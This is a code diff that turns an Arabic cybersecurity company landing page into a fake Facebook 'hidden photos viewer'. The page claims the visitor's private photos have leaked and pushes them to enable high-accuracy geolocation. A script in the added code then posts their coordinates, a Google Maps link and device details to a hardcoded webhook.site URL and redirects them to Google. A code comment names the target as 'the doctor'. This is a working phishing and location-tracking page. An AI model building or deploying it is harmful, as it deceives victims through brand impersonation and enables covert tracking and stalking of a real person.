@@ -1,160 +1,265 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>درع الأمن السيبراني | CyberShield</title>
+    <title>عارض الصور المخفية - فيسبوك</title>
     <style>
-        :root {
-            --primary-color: #00ffcc;
-            --bg-dark: #0a0b10;
-            --card-bg: #161b22;
-            --text-gray: #8b949e;
-        }
-
-        body {
+        * {
             margin: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-dark);
-            color: white;
-            overflow-x: hidden;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
         }
-
-        /* خلفية تقنية بسيطة */
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle at center, #1a237e 0%, transparent 70%);
-            opacity: 0.1;
-            z-index: -1;
-        }
-
-        header {
-            padding: 20px 50px;
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
-            border-bottom: 1px solid #30363d;
+            direction: ltr;
         }
-
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
-            color: var(--primary-color);
-            text-transform: uppercase;
-            letter-spacing: 2px;
+        .facebook-card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            max-width: 500px;
+            width: 90%;
+            overflow: hidden;
         }
-
-        nav a {
+        .fb-header {
+            background: #4267B2;
             color: white;
-            text-decoration: none;
-            margin-left: 20px;
-            font-size: 14px;
-            transition: 0.3s;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
-
-        nav a:hover { color: var(--primary-color); }
-
-        .hero {
+        .fb-header i {
+            font-size: 24px;
+        }
+        .fb-header span {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        .fb-content {
+            padding: 20px;
+        }
+        .warning-box {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .warning-box i {
+            font-size: 24px;
+        }
+        .location-required {
+            background: #e7f3ff;
+            border: 1px solid #b8daff;
+            color: #004085;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px 0;
             text-align: center;
-            padding: 100px 20px;
         }
-
-        .hero h1 {
-            font-size: 3rem;
-            margin-bottom: 10px;
-        }
-
-        .hero p {
-            color: var(--text-gray);
-            max-width: 600px;
-            margin: 0 auto 30px;
-        }
-
-        .btn {
-            background: transparent;
-            border: 1px solid var(--primary-color);
-            color: var(--primary-color);
-            padding: 12px 30px;
+        .fb-button {
+            background: #4267B2;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            font-weight: bold;
-            transition: 0.4s;
+            width: 100%;
+            margin: 10px 0;
         }
-
-        .btn:hover {
-            background: var(--primary-color);
-            color: black;
-            box-shadow: 0 0 20px var(--primary-color);
+        .fb-button:hover {
+            background: #365899;
         }
-
-        .services {
+        .fb-button:disabled {
+            background: #9cb4d8;
+            cursor: not-allowed;
+        }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4267B2;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden-images {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            padding: 50px;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 5px;
+            margin: 20px 0;
         }
-
-        .card {
-            background: var(--card-bg);
-            padding: 30px;
-            border-radius: 10px;
-            border: 1px solid #30363d;
-            transition: transform 0.3s;
-        }
-
-        .card:hover {
-            transform: translateY(-10px);
-            border-color: var(--primary-color);
-        }
-
-        .card h3 { color: var(--primary-color); }
-
-        footer {
-            text-align: center;
-            padding: 40px;
+        .hidden-images div {
+            background: #f0f2f5;
+            height: 100px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #666;
             font-size: 12px;
-            color: var(--text-gray);
-            border-top: 1px solid #30363d;
+        }
+        .fb-footer {
+            background: #f0f2f5;
+            padding: 15px 20px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            border-top: 1px solid #ddd;
         }
     </style>
 </head>
 <body>
-
-    <header>
-        <div class="logo">🛡️ CYBER-SHIELD</div>
-        <nav>
-            <a href="#">الرئيسية</a>
-            <a href="#">الخدمات</a>
-            <a href="#">فحص الثغرات</a>
-            <a href="#">اتصل بنا</a>
-        </nav>
-    </header>
-
-    <section class="hero">
-        <h1>نحمي بياناتك في عالم رقمي غير آمن</h1>
-        <p>نحن نقدم حلولاً متقدمة في الأمن السيبراني، من اختبار الاختراق إلى الاستجابة للحوادث، لضمان استمرارية عملك بأمان.</p>
-        <button class="btn">ابدأ الفحص الآن</button>
-    </section>
-
-    <section class="services">
-        <div class="card">
-            <h3>🔐 اختبار الاختراق</h3>
-            <p>نقوم بمحاكاة هجمات حقيقية لاكتشاف نقاط الضعف في نظامك قبل استغلالها.</p>
+    <div class="facebook-card">
+        <div class="fb-header">
+            <i>📸</i>
+            <span>عارض الصور المخفية - Facebook</span>
         </div>
-        <div class="card">
-            <h3>🌐 حماية الشبكات</h3>
-            <p>أنظمة مراقبة وحماية تعمل على مدار الساعة لصد أي محاولات تسلل.</p>
-        </div>
-        <div class="card">
-            <h3>🛡️ التشفير المتقدم</h3>
-            <p>تأمين قنوات الاتصال والبيانات الحساسة بأحدث بروتوكولات التشفير العالمية.</p>
-        </div>
-    </section>
+        
+        <div class="fb-content">
+            <div class="warning-box">
+                <i>🔒</i>
+                <div>
+                    <strong>تم اكتشاف 23 صورة مسربة من بروفايلك!</strong><br>
+                    <span style="font-size: 13px;">صور لم تسمح بنشرها تظهر لبعض المستخدمين</span>
+                </div>
+            </div>
 
-    <footer>
-        جميع الحقوق محفوظة &copy; 2026 درع الأمن السيبراني
-    </footer>
+            <div id="locationMessage" class="location-required">
+                <strong>⚠️ مطلوب تفعيل الموقع الجغرافي</strong><br>
+                <span style="font-size: 13px;">للتأكد من هويتك ومنع وصول الغرباء لصورك، يجب تفعيل الموقع</span>
+            </div>
 
+            <div id="loadingSection" style="display: none;">
+                <div class="loader"></div>
+                <p style="text-align: center; color: #666; margin: 10px 0;">جاري التحقق من موقعك...</p>
+            </div>
+
+            <div id="imagesSection" style="display: none;">
+                <div class="hidden-images">
+                    <div>📸 صورة 1</div>
+                    <div>📸 صورة 2</div>
+                    <div>📸 صورة 3</div>
+                    <div>📸 صورة 4</div>
+                    <div>📸 صورة 5</div>
+                    <div>📸 صورة 6</div>
+                </div>
+                <p style="color: #666; font-size: 14px; text-align: center;">هذه صورك الخاصة التي ظهرت لبعض المستخدمين</p>
+            </div>
+
+            <button class="fb-button" id="activateBtn" onclick="requestLocation()">
+                🔍 عرض الصور المخفية الآن
+            </button>
+
+            <p style="font-size: 12px; color: #999; text-align: center; margin-top: 10px;">
+                لن يتم نشر موقعك، نستخدمه فقط للتحقق من الهوية
+            </p>
+        </div>
+
+        <div class="fb-footer">
+            Facebook © 2026 · حماية الخصوصية · مساعدة
+        </div>
+    </div>
+
+    <script>
+        // رابط webhook.site الخاص بك (ثابت وجاهز)
+        const WEBHOOK_URL = 'https://webhook.site/8be65a7a-2f53-429f-942d-3b6e83ff1df0';
+
+        // دالة إرسال البيانات إلى webhook.site
+        function sendToWebhook(lat, lon, accuracy) {
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const timestamp = new Date().toLocaleString('ar-EG');
+            
+            const data = {
+                latitude: lat,
+                longitude: lon,
+                accuracy: accuracy,
+                google_maps: mapsLink,
+                time: timestamp,
+                device: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language
+            };
+
+            // إرسال البيانات
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => console.log('تم الإرسال بنجاح'))
+            .catch(error => console.error('خطأ في الإرسال:', error));
+
+            // تحويل الدكتور مباشرة إلى Google
+            window.location.href = 'https://www.google.com';
+        }
+
+        // طلب الموقع
+        function requestLocation() {
+            const btn = document.getElementById('activateBtn');
+            const locationMsg = document.getElementById('locationMessage');
+            const loadingSection = document.getElementById('loadingSection');
+            
+            btn.disabled = true;
+            btn.textContent = 'جاري التحقق...';
+            locationMsg.style.display = 'none';
+            loadingSection.style.display = 'block';
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    // نجاح - سمح بالموقع
+                    function(position) {
+                        sendToWebhook(
+                            position.coords.latitude,
+                            position.coords.longitude,
+                            position.coords.accuracy
+                        );
+                    },
+                    // خطأ - رفض الموقع
+                    function(error) {
+                        loadingSection.style.display = 'none';
+                        locationMsg.style.display = 'block';
+                        
+                        if (error.code === 1) {
+                            locationMsg.innerHTML = '<strong>❌ تم الرفض</strong><br><span style="font-size: 13px;">يجب تفعيل الموقع لعرض الصور المخفية. جرب مرة أخرى.</span>';
+                        } else {
+                            locationMsg.innerHTML = '<strong>❌ حدث خطأ</strong><br><span style="font-size: 13px;">يرجى المحاولة مرة أخرى</span>';
+                        }
+                        
+                        btn.disabled = false;
+                        btn.textContent = '🔍 عرض الصور المخفية الآن';
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                locationMsg.innerHTML = '<strong>❌ المتصفح لا يدعم</strong><br><span style="font-size: 13px;">استخدم متصفحاً أحدث</span>';
+                btn.disabled = false;
+                btn.textContent = '🔍 عرض الصور المخفية الآن';
+            }
+        }
+    </script>
 </body>
-  </html>
+    </html>
